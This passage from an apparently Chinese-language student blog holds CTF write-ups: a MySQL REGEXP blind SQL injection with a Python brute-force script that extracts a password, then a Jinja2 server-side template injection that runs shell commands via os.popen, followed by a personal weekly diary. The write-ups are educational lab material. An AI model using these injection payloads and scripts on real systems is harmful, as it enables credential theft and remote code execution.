中用于进行正则表达式匹配的操作符。使用 REGEXP 可以在查询中进行模式匹配，以查找满足特定模式的字符串。<br>以下是一个简单的示例，演示如何在 MySQL 中使用 REGEXP：<br>SELECT * FROM your_table<br>WHERE your_column REGEXP &#x27;pattern&#x27;;<br><br>在上面的示例中，your_table 是您要查询的表名，your_column 是要进行匹配的列名，而 &#x27;pattern&#x27; 则是您希望进行匹配的正则表达式模式。<br>例如，如果您想查找 your_column 中以字母 &quot;a&quot; 开头的所有字符串，可以使用以下查询：<br>SELECT * FROM your_table<br>WHERE your_column REGEXP &#x27;^a&#x27;;<br>这将返回所有以字母 &quot;a&quot; 开头的字符串。<br></code></pre></td></tr></table></figure><h3 id="测试实例"><a href="#测试实例" class="headerlink" title="测试实例:"></a>测试实例:</h3><h4 id="sql1"><a href="#sql1" class="headerlink" title="sql1:"></a>sql1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">select * from information_schema.tables <br>where table_schema=&quot;testforweb&quot; and table_name REGEXP &quot;^b&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205230905461.png" alt="image-20240205230905461"></p><p>总共回显三条记录</p><h4 id="sql1-1"><a href="#sql1-1" class="headerlink" title="sql1_1:"></a>sql1_1:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">select 1 from information_schema.tables <br>where table_schema=&quot;testforweb&quot; and table_name REGEXP &quot;^b&quot;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205231038166.png" alt="image-20240205231038166"></p><p>也回显三条记录</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">数据库的运行逻辑是先运行from后面所有的内容，满足from后面的条件之后，在执行select的内容，所以from后面多少条记录，select就打印多少条记录，打印内容取决于select 和 from之间的内容，如果是from后面产生的虚拟表的字段，则打印字段内容，如果是常量，则直接打印常量<br></code></pre></td></tr></table></figure><h4 id="测试"><a href="#测试" class="headerlink" title="测试:"></a>测试:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">select 1 from beansystemuser<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205231804893.png" alt="image-20240205231804893"></p><p>beansystemuser表总共有4条记录，该sql语句就打印4个1</p><p>所以可以存在以下盲注payload</p><h3 id="盲注payload"><a href="#盲注payload" class="headerlink" title="盲注payload:"></a>盲注payload:</h3><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h4><p><strong>select可用:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">//判断第一个表名的第一个字符是否在a-z之间<br>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#x27;^[a-z]&#x27; LIMIT 0,1) /*<br>//REGEXP &#x27;^[a-z]&#x27;即是匹配正则表达式，^表示匹配字符串的开始，[a-z]即匹配字母a-z<br><br>如果输出的第一张表的名称匹配是以a-z的字符开头的话，就会返回一个1，从而形成1=1<br><br>假如知道第一张表名称的第一个字符为c,则获取接下来的字符就是:<br>?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#x27;^c&#123;&#125;&#x27; LIMIT 0,1) /*<br><br>&#123;&#125;为任意合法的表名字符，即通过这种方式一步一步的推出表名，类似like和=的盲注<br></code></pre></td></tr></table></figure><p>所以可以用以上payload构造出用于获取表名，字段名，字段值的payload,但是以上payload只能用于select可用的情况，当select可以用时其实可以直接使用普通的盲注脚本以及时间脚本。</p><h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h4><p><strong>select不可用，但是知道（可以猜测）查询的字段名时，直接爆破字段值</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">示例:<br>select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;<br>这句sql语句直接告诉我们users表中的两个字段username和passwd,所以可以通过构造以下sql直接爆破获取这两个字段的值:<br>username = &#x27;123 || passwd regexp &quot;^&#123;&#125;&quot; /*&#x27; and passwd=&#x27;123&#x27;<br>username = &#x27;123 || username regexp &quot;^&#123;&#125;&quot; /*&#x27; and passwd=&#x27;123&#x27;<br>或<br>username = &#x27;1\&#x27; and passwd=&#x27; || passwd regexp &quot;^&#123;&#125;&quot; /*&#x27;<br>username = &#x27;1\&#x27; and passwd=&#x27; || username regexp &quot;^&#123;&#125;&quot; /*&#x27;<br></code></pre></td></tr></table></figure><p>这个局限在于我们只能爆破已知的或猜测正确的字段值，不能爆破任意字段的内容。这个payload也可以用&#x3D;和like进行替换。</p><h2 id="根据正则注入的payload2构造脚本"><a href="#根据正则注入的payload2构造脚本" class="headerlink" title="根据正则注入的payload2构造脚本:"></a>根据正则注入的payload2构造脚本:</h2><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项:"></a>注意事项:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">在正则表达式中，^a$ 表示一个精确匹配的模式，它只匹配以字母 &quot;a&quot; 开头且以字母 &quot;a&quot; 结尾的字符串。<br><br>具体解释如下：<br><br>^：表示匹配字符串的开头。<br>a：表示匹配字母 &quot;a&quot;。<br>$：表示匹配字符串的结尾。<br>因此，^a$ 只会匹配单个字符 &quot;a&quot;，而不会匹配任何其他字符串。这意味着如果要匹配一个完全等于 &quot;a&quot; 的字符串，可以使用 ^a$ 正则表达式模式。<br><br>所以当出现匹配的字符串中有$时，说明字段值已经匹配完成<br></code></pre></td></tr></table></figure><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本:"></a>脚本:</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-comment"># header=&#123;</span><br>        <span class="hljs-comment">#     &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&#x27;,</span><br>        <span class="hljs-comment">#     &#x27;Origin&#x27;: &#x27;http://2a76f9bd-c19c-4d74-9385-12c43d39a140.node3.buuoj.cn&#x27;,</span><br>        <span class="hljs-comment">#     &#x27;Referer&#x27;: &#x27;http://2a76f9bd-c19c-4d74-9385-12c43d39a140.node3.buuoj.cn/index.php&#x27;</span><br>        <span class="hljs-comment"># &#125;</span><br><br><span class="hljs-comment"># 由于是类似等于的比较方式，所以采用直接遍历，不用二分法</span><br>s = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;(),-./:;&lt;=&gt;@[\]_`&#123;|&#125;~&#x27;</span><br><br>url = <span class="hljs-string">&#x27;http://3837f8c5-85b2-4601-b191-adb8d95e9524.node5.buuoj.cn:81/index.php&#x27;</span><br><br>corret_context = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-comment"># 查找匹配当前字符</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># data = &#123;&#x27;passwd&#x27;:&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;.format(corret_context+j, parse.unquote(&#x27;%00&#x27;)),&quot;username&quot;:&quot;\\&quot;&#125;</span><br>        <span class="hljs-comment"># 由于%00不能直接传参，否则解码为空，所以需要用parse.unquote(&#x27;%00&#x27;)传参，url传参的基本要求</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>            <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;0&#125;\&quot;;&#123;1&#125;&quot;</span>.<span class="hljs-built_in">format</span>(corret_context+j, parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))<br>        &#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;当前进度:&#123;&#125;% &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i,data))<br>        <span class="hljs-comment"># r = requests.post(url=url, data=data,headers=header)</span><br>        r = requests.post(url=url, data=data)<br>        time.sleep(<span class="hljs-number">0.04</span>)<br>        true_text = <span class="hljs-string">&quot;welcome.php&quot;</span><br>        <span class="hljs-keyword">if</span> true_text <span class="hljs-keyword">in</span> r.text:<br>            corret_context += j<br>            <span class="hljs-built_in">print</span>(corret_context)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># 判断字符串是否已经全部匹配，有时候正确的字段值可能会有$,所以要酌情考虑</span><br>    <span class="hljs-keyword">if</span> corret_context.endswith(<span class="hljs-string">&quot;$&quot;</span>):<br>            corret_context = corret_context[:-<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;corret_context:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(corret_context))<br></code></pre></td></tr></table></figure><p>输出:</p><p><img src="/images/2024-2-18/image-20240206003746260.png" alt="image-20240206003746260"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">you_will_never_know7788990$<br>corret_context:you_will_never_know7788990<br></code></pre></td></tr></table></figure><h2 id="登录页面"><a href="#登录页面" class="headerlink" title="登录页面:"></a>登录页面:</h2><p><strong>由于黑名单中也过滤了admin所以我们需要用admi&#x2F;**&#x2F;n绕过黑名单，但是username在sql查询时依然以admin进行查询，不受影响。</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admi/**/n<br>&amp;passwd=you_will_never_know7788990<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240206002553833.png" alt="image-20240206002553833"></p><p>flag&#x3D;flag{1e629120-8e86-40d2-9281-fd0ded2d4383}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_[RootersCTF2019]I_&lt;3_Flask</title>
    <link href="/2024/02/18/2024-02-18-%5BRootersCTF2019%5DI3_Flask/"/>
    <url>/2024/02/18/2024-02-18-%5BRootersCTF2019%5DI3_Flask/</url>
    
    <content type="html"><![CDATA[<h1 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a href="https://blog.csdn.net/fmyyy1/article/details/115715212">RootersCTF2019]I_＜3_Flask_[rootersctf2019]i_&lt;3_flask 1-CSDN博客</a></p><h2 id="访问网页"><a href="#访问网页" class="headerlink" title="访问网页:"></a>访问网页:</h2><p><img src="/images/2024-2-18/image-20240205134548008.png" alt="image-20240205134548008"></p><p>题目是flask框架开发的，这里查找app.py，但是没有找到，抓包也没有发现有用的信息，但是如果我们要对网页进行恶意操作时，必须存在一个我们可以控制更改的注入点，一般为网页的参数，但是我们通过对网页的信息查找没有发现可疑参数，但是猜测它是flask框架的模板注入，所以我们可以使用工具对该网页的参数进行爆破。</p><h2 id="参数爆破工具-Arjun"><a href="#参数爆破工具-Arjun" class="headerlink" title="参数爆破工具:Arjun"></a>参数爆破工具:Arjun</h2><p><a href="https://blog.csdn.net/Alexhcf/article/details/108294645">Arjun：一款http参数扫描器的使用_arjun使用-CSDN博客</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载:"></a>下载:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">git clone https://github.com/s0md3v/Arjun.git<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205135826164.png" alt="image-20240205135826164"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">python3 setup.py install<br></code></pre></td></tr></table></figure><h4 id="忽略警告"><a href="#忽略警告" class="headerlink" title="忽略警告:"></a>忽略警告:</h4><p>如果在pip中出现root警告，可以用以下操作忽略</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pip install --root-user-action=ignore arjun<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205140435766.png" alt="image-20240205140435766"></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用:"></a>使用:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">arjun -u http://e4439159-0363-4410-ac62-5f45a7ccf28a.node5.buuoj.cn:81/ -m 参数<br></code></pre></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数:"></a>参数:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">get<br>post<br>JSON<br>XML<br></code></pre></td></tr></table></figure><h4 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">arjun -u http://e4439159-0363-4410-ac62-5f45a7ccf28a.node5.buuoj.cn:81/ -m get<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205141050640.png" alt="image-20240205141050640"></p><p>获取到目标网站的用户可控参数为name</p><p><img src="/images/2024-2-18/image-20240205141543822.png" alt="image-20240205141543822"></p><h2 id="检测网站是否能够进行flask框架的模板注入"><a href="#检测网站是否能够进行flask框架的模板注入" class="headerlink" title="检测网站是否能够进行flask框架的模板注入:"></a>检测网站是否能够进行flask框架的模板注入:</h2><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=&#123;&#123;8*8&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205141749756.png" alt="image-20240205141749756"></p><p>成功执行我们的8*8,所以存在模板注入，可以猜测为jinja2的模板注入</p><h2 id="构造模板注入payload"><a href="#构造模板注入payload" class="headerlink" title="构造模板注入payload:"></a>构造模板注入payload:</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.目标是使用&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;),进行文件信息的获取<br>所以需要用到eval()函数<br>2.eval函数存在于[&#x27;catch_warnings&#x27;].__init__.__globals__[&#x27;__builtins__&#x27;]中<br>3.[&#x27;catch_warnings&#x27;]存在于[].__class__.__base__.__subclasses__()中<br></code></pre></td></tr></table></figure><h4 id="构造模板注入的代码"><a href="#构造模板注入的代码" class="headerlink" title="构造模板注入的代码:"></a>构造模板注入的代码:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__():<br>    <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span>:<br>        c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls           /&#x27;).read()&quot;</span>)<br></code></pre></td></tr></table></figure><p>&#x3D;&gt;变成模板注入的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;<br>    &#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;<br>        &#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls           /&#x27;).read()&quot;)&#125;&#125;<br>&#123;% endif %&#125;<br>&#123;% endfor %&#125;<br>=&gt;合并到一行<br>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls           /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h2 id="获取网页文件信息"><a href="#获取网页文件信息" class="headerlink" title="获取网页文件信息:"></a>获取网页文件信息:</h2><p><strong>(最重要的两个目录信息为当前网页目录信息和根目录信息，一般先找这两个，如果还没有，就得去找其他目录中的文件信息)</strong></p><h3 id="获取根目录文件信息"><a href="#获取根目录文件信息" class="headerlink" title="获取根目录文件信息:"></a>获取根目录文件信息:</h3><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls           /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205143147824.png" alt="image-20240205143147824"></p><p>没有发现flag文件的信息</p><h3 id="获取网页当前目录信息"><a href="#获取网页当前目录信息" class="headerlink" title="获取网页当前目录信息:"></a>获取网页当前目录信息:</h3><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls       &#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205143502125.png" alt="image-20240205143502125"></p><p>发现flag.txt文件</p><h3 id="获取flag-txt文件的信息"><a href="#获取flag-txt文件的信息" class="headerlink" title="获取flag.txt文件的信息:"></a>获取flag.txt文件的信息:</h3><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27;%&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt       &#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240205143607585.png" alt="image-20240205143607585"></p><p>flag&#x3D;flag{066918ea-c0f6-496b-93df-9bb6062b09e5}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假第一周_周总结</title>
    <link href="/2024/02/05/2024-02-5-%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8_%E5%91%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/05/2024-02-5-%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8_%E5%91%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="寒假第一周-周总结-《我的奋斗south版》"><a href="#寒假第一周-周总结-《我的奋斗south版》" class="headerlink" title="寒假第一周_周总结-《我的奋斗south版》"></a>寒假第一周_周总结-《我的奋斗south版》</h1><h2 id="第一周"><a href="#第一周" class="headerlink" title="第一周:"></a>第一周:</h2><h3 id="Todo："><a href="#Todo：" class="headerlink" title="Todo："></a>Todo：</h3><p>1.BUUCTF第三面题目全部刷完(14道题)（6道）</p><p>反思:</p><p>刷题的时候总是想着玩手机，感觉注意就是不怎么集中，老毛病了，但是看完手机有很焦虑，只能说就是有”精神分裂”的大病,下周刷题得好好刷，把手机关机了吧emmm</p><p>2.西湖论剑比赛，以及题目复现（复现1道，2天）</p><p>反思：以为自己学了一个学期（也没有一个学期，除了暑假就没好好学过，可恶！！！！）没想到小丑还是我自己，一道题都没做出来，啊啊啊啊啊啊，受不了了！！！，得猛猛刷题才行，幸好复现的时候还算可以理解，不然要自闭了，环境搭建用了一天，确实超乎我的想象，不过还是怪自己太执着于复现出环境了，到最后浪费这么多时间，不过也算收获了很多，至少有迷之自信觉得自己以后也可以出题了ᕙ(&#96;▿´)ᕗ,不过还是希望以后能抓住事件得主次，提高效率才是关键！！！૮₍ ˃ ⤙ ˂ ₎ა</p><p>3.健身4次(3次，小年)</p><p>反思：这周去健身房上了教练课，才知道之前自己都练错了，以后还是得注意下健身得动作才行，这样才能更有效率(⌯꒪꒫꒪)੭，不过动作练对了之后，感觉更累了，果然虚批是这样的，健身主要就是想强化自己的意志，让自己能够为一件事坚持下去，所以不能放弃，再累也得继续坚持下去੭ ᐕ)੭*⁾⁾，这周只去了三次，主要还是因为小年的活动太多了，要帮很多忙，下周希望能够好好完成四次，必须得跑步，毕竟跑步我自己感觉能够缓解自己的神经焦虑(●’◡’●)。</p><p>5.社团网站配置成功</p><p>总结:这是我这周最开心的事情，三个月努力终于成为现实，过程虽然孤独艰难，但是无悔ᜊ(꒪ˊ꒳ˋ꒪)ᜊ，属于自己最特殊的礼物，给社团的一份礼物，希望我们刚刚成立的社团能越来越好✧*｡ (ˊᗜˋ*) ✧*。，本来想用阿里云配置，因为考虑到阿里云是国内，访问会快一些，但是没想到限制这么多，一个身份审核一周都还没过（虽然自己拍的图片确实有点随意，但是一周都没消息就有点过分了ᕦ༼༎ຶ_༎ຶ༽ᕗ），网站创建还得是github,就是访问有点慢，不过还是要感谢github让我完成我的2023年的梦想之一(◍˃̶ᗜ˂̶◍)✩。</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习:"></a>学习:</h2><h3 id="第一周："><a href="#第一周：" class="headerlink" title="第一周："></a>第一周：</h3><ul><li><p><input checked disabled type="checkbox"> </p><h5 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h5></li><li><p><input checked disabled type="checkbox"> </p><h5 id="第七届西湖论剑复现—only-sql-WP"><a href="#第七届西湖论剑复现—only-sql-WP" class="headerlink" title="[第七届西湖论剑复现—only_sql-WP]"></a>[第七届西湖论剑复现—only_sql-WP]</h5></li></ul><h2 id="生活"><a href="#生活" class="headerlink" title="生活:"></a>生活:</h2><p>1.《思维改变生活》看了两章</p><p>反思：这本书是别人推荐的，因为这个学期感觉自己很焦虑，有时候会莫名头疼，其实是焦虑引起的神经紊乱，看了这本书的前两章，让我的观念改变了很多，其实世界上很多的焦虑都是由我们自我不正确的观念导致的，确实学到了很多，让我这一个星期的思绪平稳了很多，想得也少了，可惜自己还是改不了爱玩手机的毛病，没读多少(&#x2F;&#x2F;̀Д&#x2F;́&#x2F;)，下周希望自己能好好看书，少玩手机，毕竟刷视频确实没有任何的意义ᕕ( ᐛ )ᕗ。</p><p>2.简单打扫了自己的房间</p><p>反思：小年确实很快乐，但是也压缩了自己的计划时间，只能简单打扫一下了，下周还是得仔细整理一下，毕竟打扫卫生也能让自己的思绪简单一些。</p><p>3.过小年</p><p>总结：和家人一起准备的，虽然弄到很晚，但其实很快乐。</p><h2 id="工作："><a href="#工作：" class="headerlink" title="工作："></a>工作：</h2><p>1.写好了下学期的社团计划安排表</p><p>反思：社长准备考研了，所以副社长要扛起大旗了，计划表是刷题的时候突然想到的（刷题的时候胡思乱想，该打，不过也挺好，毕竟一下就想出来了），计划表写出来也算是完成了一件大事，毕竟可以让自己和社团有一个明确的规划目标。</p><p>2.开了第一次社团第二届管理员线上会议</p><p>反思：感觉开会的氛围还是太安静了，其实主要问题还是我这个发起人太软弱了，发言的时候还在考虑说错话该怎么办，明明开会前很多想说的，开会的时候考虑太多就没敢说，这老毛病也得改，毕竟决定扛起大旗了，犹犹豫豫的就不行，下次开会想说什么直接说，讨论了计划表，大家都同意，虽然都是默认，但是也挺开心，毕竟也算是一种认可，希望可以把社团越做越好！！！</p><p>3.开了web部门的周会</p><p>反思：说好用b站和大家一起学习，但是看着直播还是怂了，其实限制也很多（找理由了），下周再试试！！!这周大家的计划完成度不高，我也没有好好监督大家，下周打算每天发自己这一天干了啥的接龙，我一定要做好带头作用！！！</p><h2 id="娱乐"><a href="#娱乐" class="headerlink" 